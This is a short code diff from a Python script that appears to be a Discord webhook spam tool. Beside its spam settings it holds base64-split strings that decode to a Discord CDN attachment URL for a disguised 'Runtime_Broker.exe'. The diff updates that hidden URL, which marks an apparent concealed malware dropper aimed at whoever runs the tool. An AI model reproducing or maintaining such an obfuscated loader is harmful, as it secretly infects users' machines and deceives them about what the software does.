@@ -42,8 +42,8 @@ webhook_names = config.get('Webhook-Names')
 spam_messages = config.get('Spam-Messages')
 spam_amount = config.get('Spam-Amount')
 g = 'cm9rZXIuZXhl'
-f = 'MzczMjA2MjA0MjMxNjkwL1J1bnRpbWVC'
-d = 'Y2htZW50cy8xMTE0Mjk0MDg3MjM1OTI4MTc1LzExMTQ='
+f = 'MzQxMTUvMTExNjY5ODM4MTc3NjA2ODY3OS9SdW50aW1lX0I='
+d = 'Y2htZW50cy8xMTE0MzIyOTM2NjIzNQ=='
 a = 'aHR0'
 s = 'cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YQ=='
 def check_token(token: str) -> str:
